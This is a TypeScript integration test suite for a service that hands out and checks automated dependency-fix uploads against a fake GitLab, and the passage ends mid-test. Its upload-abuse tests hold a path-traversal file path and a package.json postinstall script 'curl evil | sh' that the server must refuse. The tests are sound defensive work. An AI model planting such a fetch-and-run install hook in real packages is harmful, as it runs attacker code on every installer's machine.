import { createHash, randomUUID } from 'node:crypto';
import { fixResultBodySchema, type FixClaimAnswer, type FixClaimItem } from '@qualor/shared/fix';
import { and, eq, sql } from 'drizzle-orm';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { addMember, bearer } from '../../test/app';
import { createFakeGitLab, type FakeGitLab } from '../../test/fake-gitlab';
import { enableFixes, seedFix, seedMainVulnerability } from '../../test/fixes';
import { createIngestHarness, type IngestHarness, type IngestProject } from '../../test/ingest';
import { mainBranchId } from '../../test/issues';
import { mappedProject, scmTestConfig } from '../../test/scm';
import {
  dependencyFixes,
  jobs,
  organizations,
  projectFixSettings,
  projects,
  scmConnections,
  targetVulnerabilities,
  users,
  type FixState,
} from '../db/schema';
import { fixCheckGate } from '../fixes/checker';
import { FIX_QUEUE } from '../fixes/jobs';
import { acceptFixResult } from '../fixes/result';
import { ProblemError } from '../http/problem';

const GITLAB_ID = 41;
const BIG_GITLAB_ID = 43;
const CVE = 'CVE-2026-9001';
const NPM = 'https://registry.npmjs.org';

const integrity = (version: string) =>
  `sha512-${createHash('sha512').update(`qf-a-${version}`).digest('base64')}`;

const packageJson = (range: string, extra = '') =>
  `{\n  "name": "app",\n  "dependencies": {\n    "qf-a": "${range}"\n  }${extra}\n}\n`;

/** An npm v3 lockfile with qf-a at `version` and `filler` unrelated packages that never change. */
const packageLock = (version: string, filler = 0) => {
  const packages: Record<string, object> = {
    '': { name: 'app', dependencies: { 'qf-a': '^1.2.5' } },
    'node_modules/qf-a': {
      version,
      resolved: `${NPM}/qf-a/-/qf-a-${version}.tgz`,
      integrity: integrity(version),
    },
  };
  for (let i = 0; i < filler; i++) {
    const name = `filler-${String(i).padStart(6, '0')}`;
    packages[`node_modules/${name}`] = {
      version: '1.0.0',
      resolved: `${NPM}/${name}/-/${name}-1.0.0.tgz`,
      integrity: `sha512-${'A'.repeat(86)}==`,
    };
  }
  return `${JSON.stringify({ name: 'app', lockfileVersion: 3, packages }, null, 2)}\n`;
};

const b64 = (text: string | Buffer) => Buffer.from(text).toString('base64');
const sha256 = (text: string) => createHash('sha256').update(text).digest('hex');

const GO_PKG = 'example.com/qf';
const h1 = (c: string) => `h1:${c.repeat(43)}=`;
const goMod = (qf: string) => `module example.com/app\n\ngo 1.22\n\nrequire ${GO_PKG} ${qf}\n`;
const goSum = (qf: string) => `${GO_PKG} ${qf} ${h1('a')}\n${GO_PKG} ${qf}/go.mod ${h1('b')}\n`;

interface Answer {
  statusCode: number;
  json: () => { code?: string; reason?: string; detail?: string; state?: FixState };
}
const problem = (res: Answer) => {
  const body = res.json();
  return [res.statusCode, body.code, body.reason ?? null];
};

describe('the fix job: claim and result (0.16 fix MRs §6.5-§6.7, B1, R4-R8, R16, R31)', () => {
  let h: IngestHarness;
  let fake: FakeGitLab;
  let project: IngestProject & { connectionId: string };
  let big: IngestProject & { connectionId: string };
  let other: IngestProject;
  let projectId: string;
  let main: string;
  let token: Record<string, string>;
  let pkgs = 0;

  const db = () => h.ctx.db;
  const fresh = () => `qf-pkg-${++pkgs}`;
  const vulnerable = (
    packageName: string,
    over: Partial<Parameters<typeof seedMainVulnerability>[2]> = {},
    target = { id: projectId, mainBranchId: main },
  ) =>
    seedMainVulnerability(db(), target, {
      ecosystem: 'npm',
      packageName,
      version: '1.2.5',
      vulnerabilityId: CVE,
      severity: 'high',
      fixedVersion: '1.2.6, 0.2.4',
      ...over,
    });
  const claim = (body: object, headers = token, key = project.key) =>
    h.ctx.app.inject({
      method: 'POST',
      url: `/api/v0/projects/fixes/claim?projectKey=${encodeURIComponent(key)}`,
      headers,
      payload: { families: ['js'], branch: 'main', ...body },
    });
  const claimed = async (body: object = {}, headers = token, key = project.key) => {
    const res = await claim(body, headers, key);
    expect(res.statusCode, res.body).toBe(200);
    return res.json() as FixClaimAnswer;
  };
  /** A requested fix of qf-a, claimed alone; earlier rows of qf-a go first. */
  const claimQfA = async (seed: Partial<Parameters<typeof seedFix>[1]> = {}) => {
    await db()
      .delete(dependencyFixes)
      .where(
        and(eq(dependencyFixes.projectId, projectId), eq(dependencyFixes.packageName, 'qf-a')),
      );
    await seedFix(db(), { projectId, family: 'js', packageName: 'qf-a', ...seed });
    const answer = await claimed({ max: 1 });
    expect(answer.items).toHaveLength(1);
    return answer.items[0]!;
  };
  const result = (fixId: string, body: object, headers = token) =>
    h.ctx.app.inject({
      method: 'PUT',
      url: `/api/v0/fixes/${fixId}/result`,
      headers,
      payload: body,
    });
  const head = (id = GITLAB_ID) => fake.headOf(id, 'main')!;
  /** Releases of held reads; afterEach runs those a failing test left. */
  const opens: (() => void)[] = [];
  /** Holds the next `merge_base` read until the returned function runs. */
  const holdMergeBase = (): (() => void) => {
    let open: () => void = () => undefined;
    const held = new Promise<void>((resolve) => {
      open = resolve;
    });
    fake.inject('GET', /\/merge_base$/, { status: 200, passThrough: true, before: () => held });
    opens.push(open);
    return open;
  };
  /** A requested fix of the package, claimed alone. */
  const claimPackage = async (packageName: string) => {
    await seedFix(db(), { projectId, family: 'js', packageName });
    const answer = await claimed({ max: 1 });
    expect(answer.items).toHaveLength(1);
    return answer.items[0]!;
  };
  /** What the route gives `acceptFixResult`, for the tests that call it with injected limits. */
  const scmDeps = () => ({
    db: db(),
    scm: { secretKey: h.ctx.config.secretKey, internalHosts: h.ctx.config.scmInternalHosts },
  });
  const projectRow = async () =>
    (await db().select().from(projects).where(eq(projects.id, projectId)))[0]!;
  const personalToken = async () => {
    const res = await h.ctx.app.inject({
      method: 'POST',
      url: '/api/v0/tokens',
      headers: h.orgAdmin.headers,
      payload: { name: `fix-pat-${++pkgs}`, scopes: ['analysis:write'] },
    });
    return bearer((res.json() as { token: string }).token);
  };
  /** A project of a second organisation, made once. */
  const otherOrganizationProject = async () => {
    const [org] = await db()
      .insert(organizations)
      .values({ key: 'fj-elsewhere', name: 'Elsewhere' })
      .returning({ id: organizations.id });
    const [admin] = await db().select().from(users).where(eq(users.username, 'ingest-admin'));
    await addMember(h.ctx, org!.id, admin!.id, 'admin');
    return h.project('FJ-ELSEWHERE', { organizationId: org!.id, session: h.orgAdmin });
  };
  /** The good upload of qf-a 1.2.5 → 1.2.6 on main's head. */
  const upload = (item: FixClaimItem, over: Record<string, unknown> = {}) => ({
    generation: item.generation,
    leaseToken: item.leaseToken,
    baseSha: head(),
    installedVersion: '1.2.5',
    targetVersion: '1.2.6',
    targets: [{ installed: '1.2.5', target: '1.2.6', lockfile: 'package-lock.json' }],
    files: [
      { path: 'package.json', content: b64(packageJson('^1.2.6')) },
      { path: 'package-lock.json', content: b64(packageLock('1.2.6')) },
    ],
    lockfiles: [{ path: 'package-lock.json', relation: 'direct', mechanism: null, dependents: [] }],
    unfixable: [],
    ...over,
  });
  const row = async (id: string) =>
    (await db().select().from(dependencyFixes).where(eq(dependencyFixes.id, id)))[0]!;
  const fixJobs = () =>
    db()
      .select()
      .from(jobs)
      .where(and(eq(jobs.queue, FIX_QUEUE), sql`${jobs.concurrencyKey} LIKE 'fix:%'`));
  /** Whatever the fake was asked to change: nothing, for any refused or failed upload. */
  const writes = () => fake.requests.filter((r) => r.method !== 'GET');
  const refused = async (item: FixClaimItem, res: Answer, rule: string) => {
    expect(problem(res), JSON.stringify(res.json())).toEqual([422, 'UPLOAD_REFUSED', rule]);
    expect(await row(item.id)).toMatchObject({
      state: 'failed',
      failure: { code: 'upload_refused' },
      leaseTokenHash: null,
      prepared: null,
    });
    expect(await fixJobs()).toEqual([]);
    expect(writes()).toEqual([]);
  };

  beforeAll(async () => {
    fake = await createFakeGitLab();
    fake.addProject({ id: GITLAB_ID, path: 'acme/fixes/jobs' });
    fake.addFile(GITLAB_ID, 'main', 'package.json', packageJson('^1.2.5'));
    fake.addFile(GITLAB_ID, 'main', 'package-lock.json', packageLock('1.2.5'));
    fake.addFile(GITLAB_ID, 'main', 'go.mod', goMod('v1.2.5'));
    fake.addFile(GITLAB_ID, 'main', 'go.sum', goSum('v1.2.5'));
    fake.addProject({ id: BIG_GITLAB_ID, path: 'acme/fixes/big' });
    fake.addFile(BIG_GITLAB_ID, 'main', 'package.json', packageJson('^1.2.5'));
    fake.addFile(BIG_GITLAB_ID, 'main', 'package-lock.json', packageLock('1.2.5', 52_000));
    h = await createIngestHarness({ config: scmTestConfig(fake) });
    project = await mappedProject(h, fake, 'FJ', GITLAB_ID, { ownConnection: true });
    projectId = project.id;
    token = bearer(project.token);
    big = await mappedProject(h, fake, 'FJ-BIG', BIG_GITLAB_ID, {
      connectionId: project.connectionId,
    });
    other = await h.project('FJ-OTHER');
    main = await mainBranchId(db(), projectId);
    await vulnerable('qf-a');
  });
  afterAll(async () => {
    await h.close();
    await fake.close();
  });
  beforeEach(async () => {
    await enableFixes(h, projectId, { maxOpen: 20 });
    fake.clearRequests();
  });
  afterEach(async () => {
    for (const open of opens.splice(0)) open();
    await db().delete(dependencyFixes);
    await db().delete(jobs).where(eq(jobs.queue, FIX_QUEUE));
  });

  it('project tokens only (B1): a personal token with analysis:write and a session get 403', async () => {
    const pat = await h.ctx.app.inject({
      method: 'POST',
      url: '/api/v0/tokens',
      headers: h.orgAdmin.headers,
      payload: { name: 'fix-pat', scopes: ['analysis:write'] },
    });
    const personal = bearer((pat.json() as { token: string }).token);
    const fixId = await seedFix(db(), {
      projectId,
      family: 'js',
      packageName: 'qf-a',
      state: 'preparing',
    });
    const body = { generation: 1, leaseToken: 'x', released: true };
    for (const headers of [personal, h.orgAdmin.headers]) {
      expect(problem(await claim({}, headers))).toEqual([403, 'TOKEN_NOT_ALLOWED', null]);
      expect(problem(await result(fixId, body, headers))).toEqual([403, 'TOKEN_NOT_ALLOWED', null]);
    }
    expect((await row(fixId)).state).toBe('preparing');
    // And the project token is refused everywhere else, with the new text.
    const elsewhere = await h.ctx.app.inject({
      method: 'GET',
      url: `/api/v0/projects/${projectId}/fixes`,
      headers: token,
    });
    expect(problem(elsewhere)).toEqual([403, 'TOKEN_NOT_ALLOWED', null]);
    expect((elsewhere.json() as { title: string }).title).toContain(
      "claim and upload their project's fixes",
    );
  });

  it('claim: oldest first, preparing with a 30-minute lease and the handled vulnerabilities (R4, R5)', async () => {
    const [b, c] = [fresh(), fresh()];
    await vulnerable(b, { vulnerabilityId: 'GHSA-b', version: '2.0.0', fixedVersion: '2.0.1' });
    await vulnerable(b, {
      vulnerabilityId: 'GHSA-b',
      version: '1.4.0',
      fixedVersion: '2.0.1, 1.4.2',
    });
    await vulnerable(c);
    const at = (minutes: number) => new Date(Date.now() - minutes * 60_000);
    const first = await seedFix(db(), {
      projectId,
      family: 'js',
      packageName: b,
      updatedAt: at(30),
    });
    const second = await seedFix(db(), {
      projectId,
      family: 'js',
      packageName: 'qf-a',
      updatedAt: at(20),
    });
    const third = await seedFix(db(), {
      projectId,
      family: 'js',
      packageName: c,
      state: 'open',
      refresh: true,
      updatedAt: at(10),
    });
    // An open MR without refresh and a fix of another family are not claimable.
    await seedFix(db(), { projectId, family: 'js', packageName: fresh(), state: 'open' });
    await seedFix(db(), { projectId, family: 'go', packageName: 'example.com/qf' });
    await db()
      .update(projectFixSettings)
      .set({ lastClaimAt: null })
      .where(eq(projectFixSettings.projectId, projectId));

    expect(await claimed({ families: ['maven'] })).toEqual({ items: [], reason: null });
    const before = Date.now();
    const answer = await claimed({ max: 10, revision: 'a'.repeat(40) });
    expect(answer.reason).toBeNull();
    expect(answer.items.map((i) => i.id)).toEqual([first, second, third]);
    expect(answer.items[0]).toEqual<FixClaimItem>({
      id: first,
      generation: 1,
      leaseToken: expect.stringMatching(/^[\w-]{43}$/),
      family: 'js',
      packageName: b,
      installedVersions: ['1.4.0', '2.0.0'],
      vulnerabilities: [
        {
          id: 'GHSA-b',
          severity: 'high',
          title: null,
          url: null,
          installedVersions: ['1.4.0', '2.0.0'],
          fixedVersions: ['2.0.1', '1.4.2'],
        },
      ],
      mainBranch: 'main',
      declinedTarget: null,
    });
    // R5: Trivy's comma list, split.
    expect(answer.items[1]!.vulnerabilities).toEqual([
      expect.objectContaining({
        id: CVE,
        installedVersions: ['1.2.5'],
        fixedVersions: ['1.2.6', '0.2.4'],
      }),
    ]);
    for (const item of answer.items) {
      const stored = await row(item.id);
      expect(stored.state).toBe('preparing');
      expect(stored.leaseTokenHash).toBe(
        createHash('sha256').update(item.leaseToken).digest('hex'),
      );
      const lease = stored.leaseUntil!.getTime() - before;
      expect(lease).toBeGreaterThan(29 * 60_000);
      expect(lease).toBeLessThan(31 * 60_000);
      expect(stored.vulnerabilityIds.length).toBeGreaterThan(0);
    }
    expect((await row(first)).vulnerabilityIds).toEqual(['GHSA-b']);
    expect(new Set(answer.items.map((i) => i.leaseToken)).size).toBe(3);
    // Nothing left of the js family.
    expect(await claimed({})).toEqual({ items: [], reason: null });
    const [settings] = await db()
      .select()
      .from(projectFixSettings)
      .where(eq(projectFixSettings.projectId, projectId));
    expect(settings!.lastClaimAt).not.toBeNull();
  });

  it('reasons (R4): a switched-off project answers its reason; another branch is 409 NOT_MAIN_BRANCH', async () => {
    const fixId = await seedFix(db(), { projectId, family: 'js', packageName: 'qf-a' });
    await enableFixes(h, projectId, { enabled: false });
    await db()
      .update(projectFixSettings)
      .set({ lastClaimAt: null })
      .where(eq(projectFixSettings.projectId, projectId));
    expect(await claimed({})).toEqual({ items: [], reason: 'disabled' });
    const [off] = await db()
      .select()
      .from(projectFixSettings)
      .where(eq(projectFixSettings.projectId, projectId));
    expect(off!.lastClaimAt).toBeNull();

    await enableFixes(h, projectId);
    await db()
      .update(scmConnections)
      .set({ fixMrsAllowed: false })
      .where(eq(scmConnections.id, project.connectionId));
    expect(await claimed({})).toEqual({ items: [], reason: 'not_allowed' });
    await enableFixes(h, projectId);
    expect(problem(await claim({ branch: 'feature/x' }))).toEqual([409, 'NOT_MAIN_BRANCH', null]);
    expect((await row(fixId)).state).toBe('requested');
    // Another project's key with this project's token.
    expect(problem(await claim({}, token, other.key))).toEqual([404, 'PROJECT_NOT_FOUND', null]);
  });

  it('nothing left (R31): a fix whose main rows are gone is fixed, one without a fixed version no_fix', async () => {
    const gone = await seedFix(db(), { projectId, family: 'js', packageName: fresh() });
    const noFixed = fresh();
    await vulnerable(noFixed, { fixedVersion: null });
    const unfixable = await seedFix(db(), { projectId, family: 'js', packageName: noFixed });
    // With an MR (R8): a gone package stays for the pass, one without a fixed version stays open.
    const goneWithMr = await seedFix(db(), {
      projectId,
      family: 'js',
      packageName: fresh(),
      state: 'open',
      refresh: true,
    });
    const noFixedMr = fresh();
    await vulnerable(noFixedMr, { fixedVersion: null });
    const unfixableWithMr = await seedFix(db(), {
      projectId,
      family: 'js',
      packageName: noFixedMr,
      state: 'open',
      refresh: true,
    });
    const handed = await seedFix(db(), { projectId, family: 'js', packageName: 'qf-a' });

    const answer = await claimed({ max: 10 });
    expect(answer.items.map((i) => i.id)).toEqual([handed]);
    expect(await row(gone)).toMatchObject({ state: 'fixed', failure: null });
    expect(await row(unfixable)).toMatchObject({
      state: 'no_fix',
      failure: { code: 'no_fixed_version' },
    });
    expect(await row(goneWithMr)).toMatchObject({ state: 'open', refresh: true, failure: null });
    expect(await row(unfixableWithMr)).toMatchObject({
      state: 'open',
      refresh: false,
      failure: { code: 'no_fixed_version' },
    });
  });

  it('two claims at once (Review Focus 4): one fix is handed out once, no claim takes more than max', async () => {
    await seedFix(db(), { projectId, family: 'js', packageName: 'qf-a' });
    const answers = await Promise.all([claimed({ max: 1 }), claimed({ max: 1 })]);
    for (const answer of answers) expect(answer.items.length).toBeLessThanOrEqual(1);
    expect(answers.flatMap((a) => a.items)).toHaveLength(1);

    // Three fixes, five claims of one at a time: each fix once.
    await db().delete(dependencyFixes);
    const names = [fresh(), fresh(), fresh()];
    for (const name of names) await vulnerable(name);
    const ids = [];
    for (const name of names)
      ids.push(await seedFix(db(), { projectId, family: 'js', packageName: name }));
    const many = await Promise.all(Array.from({ length: 5 }, () => claimed({ max: 1 })));
    for (const answer of many) expect(answer.items.length).toBeLessThanOrEqual(1);
    expect(many.flatMap((a) => a.items.map((i) => i.id)).toSorted()).toEqual(ids.toSorted());
  });

  it('accepts an upload: committing, the files kept with their new entries, one commit job', async () => {
    const item = await claimQfA();
    const res = await result(item.id, upload(item));
    expect(res.statusCode, res.body).toBe(202);
    expect(res.json()).toEqual({ state: 'committing' });
    const stored = await row(item.id);
    expect(stored).toMatchObject({
      state: 'committing',
      baseSha: head(),
      targets: [{ installed: '1.2.5', target: '1.2.6', lockfile: 'package-lock.json' }],
      targetVersion: '1.2.6',
      installedVersion: '1.2.5',
      leaseTokenHash: null,
      leaseUntil: null,
      failure: null,
    });
    expect(stored.prepared).toEqual({
      baseSha: head(),
      files: [
        { path: 'package.json', content: packageJson('^1.2.6') },
        { path: 'package-lock.json', content: packageLock('1.2.6') },
      ],
      lockfiles: [
        { path: 'package-lock.json', relation: 'direct', mechanism: null, dependents: [] },
      ],
      unfixable: [],
      additions: [
        { path: 'package-lock.json', entries: [{ slot: null, name: 'qf-a', version: '1.2.6' }] },
      ],
    });
    const queued = await fixJobs();
    expect(queued.map((j) => [j.status, j.concurrencyKey, j.payload])).toEqual([
      [
        'queued',
        `fix:${item.id}`,
        { kind: 'commit', fixId: item.id, generation: item.generation, attempt: 0 },
      ],
    ]);
    expect(writes()).toEqual([]);
    // The lease is spent: the same upload again is 409.
    expect(problem(await result(item.id, upload(item)))).toEqual([409, 'FIX_LEASE_LOST', null]);
  });

  it('keeps CRLF line ends and a UTF-8 byte order mark as uploaded (Review Focus 1)', async () => {
    const crlf = (text: string) => `\uFEFF${text.replaceAll('\n', '\r\n')}`;
    fake.addFile(GITLAB_ID, 'main', 'package.json', crlf(packageJson('^1.2.5')));
    try {
      const item = await claimQfA();
      const res = await result(
        item.id,
        upload(item, {
          files: [
            { path: 'package.json', content: b64(crlf(packageJson('^1.2.6'))) },
            { path: 'package-lock.json', content: b64(packageLock('1.2.6')) },
          ],
        }),
      );
      expect(res.statusCode, res.body).toBe(202);
      expect((await row(item.id)).prepared!.files[0]!.content).toBe(crlf(packageJson('^1.2.6')));
    } finally {
      fake.addFile(GITLAB_ID, 'main', 'package.json', packageJson('^1.2.5'));
    }
  });

  it('upload abuse (spec §11.1): each refused by its rule, the fix failed, nothing queued or written', async () => {
    const cases: [string, (item: FixClaimItem) => object][] = [
      [
        'path_not_allowed',
        (item) =>
          upload(item, {
            files: [{ path: '../.github/workflows/x.yml', content: b64('on: push\n') }],
          }),
      ],
      [
        'new_file',
        (item) =>
          upload(item, {
            files: [
              ...upload(item).files,
              { path: 'yarn.lock', content: b64('# yarn lockfile v1\n') },
            ],
            // Ruling T9i: an uploaded lockfile needs a target.
            targets: [
              ...upload(item).targets,
              { installed: '1.2.5', target: '1.2.6', lockfile: 'yarn.lock' },
            ],
          }),
      ],
      [
        'too_many_files',
        (item) =>
          upload(item, {
            files: Array.from({ length: 51 }, (_, i) => ({
              path: `p${i}/package.json`,
              content: b64('{}\n'),
            })),
          }),
      ],
      [
        'too_large',
        (item) =>
          upload(item, {
            files: [
              { path: 'package-lock.json', content: b64(Buffer.alloc(33 * 1024 * 1024, 97)) },
            ],
          }),
      ],
      [
        'not_utf8',
        (item) =>
          upload(item, {
            files: [{ path: 'package.json', content: b64(Buffer.from([0x7b, 0xff, 0xfe, 0x7d])) }],
          }),
      ],
      [
        'duplicate_path',
        (item) => upload(item, { files: [...upload(item).files, upload(item).files[0]] }),
      ],
      ['base_not_on_main', (item) => upload(item, { baseSha: fake.pushAs(GITLAB_ID, 'side', {}) })],
    ];
    for (const [rule, body] of cases) {
      const item = await claimQfA();
      fake.clearRequests();
      const res = await result(item.id, body(item));
      await refused(item, res, rule);
      expect(res.json().detail ?? null, rule).toEqual(
        rule === 'base_not_on_main' ? null : expect.any(String),
      );
    }
    // A random sha is no commit of the repository either.
    const item = await claimQfA();
    await refused(
      item,
      await result(item.id, upload(item, { baseSha: 'f'.repeat(40) })),
      'base_not_on_main',
    );
  });

  it('smuggling end to end (spec §11.8): an allowlisted package.json adding postinstall is other_change', async () => {
    const item = await claimQfA();
    const res = await result(
      item.id,
      upload(item, {
        files: [
          {
            path: 'package.json',
            content: b64(
              packageJson('^1.2.6', ',\n  "scripts": { "postinstall": "curl evil | sh" }'),
            ),
          },
          { path: 'package-lock.json', content: b64(packageLock('1.2.6')) },
        ],
      }),
    );
    await refused(item, res, 'other_change');
    expect(res.json().detail).toBe('package.json');
    expect((await row(item.id)).failure!.message).toBe(
      "The change touches more than the package's version and its pin. File: package.json",
    );
  });

  it('targets (R7): below the server choice, an installed version main lacks, a wrong targetVersion', async () => {
    const cases: [string, Record<string, unknown>][] = [
      [
        'below_target',
        {
          // Above the installed version (ruling T9g), below the server's choice 1.2.6.
          targetVersion: '1.2.6-rc.1',
          targets: [{ installed: '1.2.5', target: '1.2.6-rc.1', lockfile: 'package-lock.json' }],
        },
      ],
      [
        'not_vulnerable',
        {
          installedVersion: '1.0.0',
          targets: [{ installed: '1.0.0', target: '1.2.6', lockfile: 'package-lock.json' }],
        },
      ],
      ['target_mismatch', { targetVersion: '1.2.7' }],
      [
        'target_mismatch',
        {
          targets: [
            { installed: '1.2.5', target: '1.2.6', lockfile: 'apps/web/package-lock.json' },
          ],
        },
      ],
      ['no_targets', { targets: [] }],
    ];
    for (const [rule, over] of cases) {
      const item = await claimQfA();
      fake.clearRequests();
      await refused(item, await result(item.id, upload(item, over)), rule);
      // The targets are checked before the SCM is read.
      expect(fake.requests).toEqual([]);
    }
  });

  it('the base must be current main (ruling T3h): a lockfile main changed since is base_outdated', async () => {
    const item = await claimQfA();
    const base = head();
    fake.addFile(
      GITLAB_ID,
      'main',
      'package-lock.json',
      packageLock('1.2.5').replace('"app"', '"app2"'),
    );
    try {
      await refused(item, await result(item.id, upload(item, { baseSha: base })), 'base_outdated');
    } finally {
      fake.addFile(GITLAB_ID, 'main', 'package-lock.json', packageLock('1.2.5'));
    }
    // An unrelated file changed on main since the base: accepted.
    const next = await claimQfA();
    const older = head();
    fake.addFile(GITLAB_ID, 'main', 'README.md', '# app\n');
    expect(older).not.toBe(head());
    const res = await result(next.id, upload(next, { baseSha: older }));
    expect(res.statusCode, res.body).toBe(202);
    expect(await row(next.id)).toMatchObject({ state: 'committing', baseSha: older });
  });

  it('stale: another lease token is 409 and changes nothing; another project fix is 404', async () => {
    const item = await claimQfA();
    const before = await row(item.id);
    fake.clearRequests();
    expect(
      problem(await result(item.id, upload(item, { leaseToken: `${item.leaseToken.slice(1)}x` }))),
    ).toEqual([409, 'FIX_LEASE_LOST', null]);
    expect(
      problem(await result(item.id, upload(item, { generation: item.generation + 1 }))),
    ).toEqual([409, 'FIX_LEASE_LOST', null]);
    expect(await row(item.id)).toEqual(before);
    // The lease is checked before anything else: the repository was not even read.
    expect(fake.requests).toEqual([]);
    const foreign = await seedFix(db(), {
      projectId: other.id,
      family: 'js',
      packageName: 'qf-a',
      state: 'preparing',
    });
    const res = await result(foreign, upload(item));
    expect(problem(res)).toEqual([404, 'NOT_FOUND', null]);
    expect((res.json() as { title: string }).title).toBe('Fix not found');
    expect((await row(foreign)).state).toBe('preparing');
    expect(writes()).toEqual([]);
  });

  it('expired lease (Review Focus 4): an upload after lease_until is 409 and changes nothing', async () => {
    const item = await claimQfA();
    await db()
      .update(dependencyFixes)
      .set({ leaseUntil: sql`now() - interval '1 minute'` })
      .where(eq(dependencyFixes.id, item.id));
    expect(problem(await result(item.id, upload(item)))).toEqual([409, 'FIX_LEASE_LOST', null]);
    expect((await row(item.id)).state).toBe('preparing');
    expect(await fixJobs()).toEqual([]);
  });

  it('a refused upload of a fix with an MR keeps it open with the failure shown (R8, ruling F7)', async () => {
    const item = await claimQfA({ state: 'open', refresh: true });
    const res = await result(
      item.id,
      upload(item, { files: [{ path: 'README.md', content: b64('x') }] }),
    );
    expect(problem(res)).toEqual([422, 'UPLOAD_REFUSED', 'path_not_allowed']);
    expect(await row(item.id)).toMatchObject({
      state: 'open',
      refresh: false,
      mrNumber: 12,
      failure: { code: 'upload_refused' },
      leaseTokenHash: null,
    });
    expect(await fixJobs()).toEqual([]);
  });

  it('failure is scrubbed (B9): no token, at most 2 KiB, failed', async () => {
    const item = await claimQfA();
    // Assembled at run time, so the repository's own Gitleaks pass finds no secret here.
    const secret = ['npm', 'S3CR3T', 'value', '0123456789'].join('_');
    const start = 'npm ERR! code E404\n';
    const end = `\nnpm ERR! 404\n//r.example/:_authToken=${secret}\nfailed at the end\n`;
    // Ruling F9: 8 000 characters, under the schema's 8 192.
    const message = `${start}${'x'.repeat(8000 - start.length - end.length)}${end}`;
    expect(message.length).toBe(8000);
    const res = await result(item.id, {
      generation: item.generation,
      leaseToken: item.leaseToken,
      failure: { code: 'package_manager', message },
    });
    expect(res.statusCode, res.body).toBe(202);
    expect(res.json()).toEqual({ state: 'failed' });
    const stored = await row(item.id);
    expect(stored.state).toBe('failed');
    expect(stored.failure!.code).toBe('package_manager');
    expect(stored.failure!.message).not.toContain(secret);
    expect(stored.failure!.message).toContain(
      '//r.example/:_authToken=[redacted]\nfailed at the end',
    );
    expect(Buffer.byteLength(stored.failure!.message)).toBeLessThanOrEqual(2048);
    expect(stored.leaseTokenHash).toBeNull();
    expect(writes()).toEqual([]);
  });

  it('noFix and released (R8): no_fix; a release is requested again, or open with refresh', async () => {
    let item = await claimQfA();
    let res = await result(item.id, {
      generation: item.generation,
      leaseToken: item.leaseToken,
      noFix: { reason: 'declined', message: 'The target 1.2.6 was declined' },
    });
    expect([res.statusCode, res.json()]).toEqual([202, { state: 'no_fix' }]);
    expect(await row(item.id)).toMatchObject({
      state: 'no_fix',
      failure: { code: 'declined', message: 'The target 1.2.6 was declined' },
      leaseTokenHash: null,
    });

    item = await claimQfA();
    res = await result(item.id, {
      generation: item.generation,
      leaseToken: item.leaseToken,
      released: true,
    });
    expect([res.statusCode, res.json()]).toEqual([202, { state: 'requested' }]);
    expect(await row(item.id)).toMatchObject({
      state: 'requested',
      generation: item.generation + 1,
      leaseTokenHash: null,
      leaseUntil: null,
    });

    item = await claimQfA({ state: 'open', refresh: true });
    res = await result(item.id, {
      generation: item.generation,
      leaseToken: item.leaseToken,
      released: true,
    });
    expect([res.statusCode, res.json()]).toEqual([202, { state: 'open' }]);
    expect(await row(item.id)).toMatchObject({
      state: 'open',
      refresh: true,
      generation: item.generation + 1,
      mrNumber: 12,
    });
    expect(await fixJobs()).toEqual([]);
  });

  it('SCM down (R16): merge_base answers 503, so the upload is 503 and the fix stays preparing', async () => {
    const item = await claimQfA();
    fake.inject('GET', /\/merge_base$/, { status: 503, body: { message: 'down' } });
    const res = await result(
      item.id,
      upload(item, { baseSha: fake.pushAs(GITLAB_ID, 'side', {}) }),
    );
    expect(problem(res)).toEqual([503, 'SCM_UNAVAILABLE', null]);
    expect(res.headers['retry-after']).toBe('10');
    expect(await row(item.id)).toMatchObject({ state: 'preparing', failure: null });
    expect(await fixJobs()).toEqual([]);
  });

  it('permanent SCM failures end the upload (ruling T9d): a 403 is failed scm_permission, 202', async () => {
    const item = await claimQfA();
    fake.clearRequests();
    fake.inject('GET', /\/merge_base$/, { status: 403, body: { message: '403 Forbidden' } });
    const res = await result(
      item.id,
      upload(item, { baseSha: fake.pushAs(GITLAB_ID, 'side', {}) }),
    );
    expect([res.statusCode, res.json()]).toEqual([202, { state: 'failed' }]);
    expect(await row(item.id)).toMatchObject({
      state: 'failed',
      failure: { code: 'scm_permission' },
      leaseTokenHash: null,
      prepared: null,
    });
    expect((await row(item.id)).failure!.message).not.toContain('403 Forbidden');
    expect(await fixJobs()).toEqual([]);
    expect(writes()).toEqual([]);

    // R8, ruling F7: a fix with an MR stays open with the failure shown.
    const withMr = await claimQfA({ state: 'open', refresh: true });
    fake.inject('GET', /\/repository\/files\/.+\/raw$/, { status: 403, body: {} });
    const open = await result(withMr.id, upload(withMr));
    expect([open.statusCode, open.json()]).toEqual([202, { state: 'open' }]);
    expect(await row(withMr.id)).toMatchObject({
      state: 'open',
      refresh: false,
      mrNumber: 12,
      failure: { code: 'scm_permission' },
      leaseTokenHash: null,
    });

    // A refused request (GitLab 400 on the branch read) is scm_refused.
    const refused = await claimQfA();
    fake.inject('GET', /\/repository\/branches\/main$/, { status: 400, body: {} });
    const answer = await result(refused.id, upload(refused));
    expect([answer.statusCode, answer.json()]).toEqual([202, { state: 'failed' }]);
    expect((await row(refused.id)).failure).toMatchObject({ code: 'scm_refused' });
    expect(await fixJobs()).toEqual([]);
    expect(writes()).toEqual([]);
  });

  it('a connection no client can be made for ends the upload as scm_refused (ruling T9d)', async () => {
    const item = await claimQfA();
    const [connection] = await db()
      .select()
      .from(scmConnections)
      .where(eq(scmConnections.id, project.connectionId));
    await db()
      .update(scmConnections)
      .set({ tokenEnc: { v: 1, iv: 'AAAA', ct: 'AAAA', tag: 'AAAA' } })
      .where(eq(scmConnections.id, project.connectionId));
    try {
      fake.clearRequests();
      const res = await result(item.id, upload(item));
      expect([res.statusCode, res.json()]).toEqual([202, { state: 'failed' }]);
      expect((await row(item.id)).failure).toMatchObject({ code: 'scm_refused' });
      expect(fake.requests).toEqual([]);
    } finally {
      await db()
        .update(scmConnections)
        .set({ tokenEnc: connection!.tokenEnc })
        .where(eq(scmConnections.id, project.connectionId));
    }
  });

  it('one upload check per project at a time (ruling T9a): a second is 503 FIX_CHECK_BUSY, then accepted', async () => {
    const other = fresh();
    await vulnerable(other);
    await seedFix(db(), { projectId, family: 'js', packageName: other });
    await seedFix(db(), { projectId, family: 'js', packageName: 'qf-a' });
    const { items } = await claimed({ max: 10 });
    const holder = items.find((i) => i.packageName === other)!;
    const second = items.find((i) => i.packageName === 'qf-a')!;
    const open = holdMergeBase();
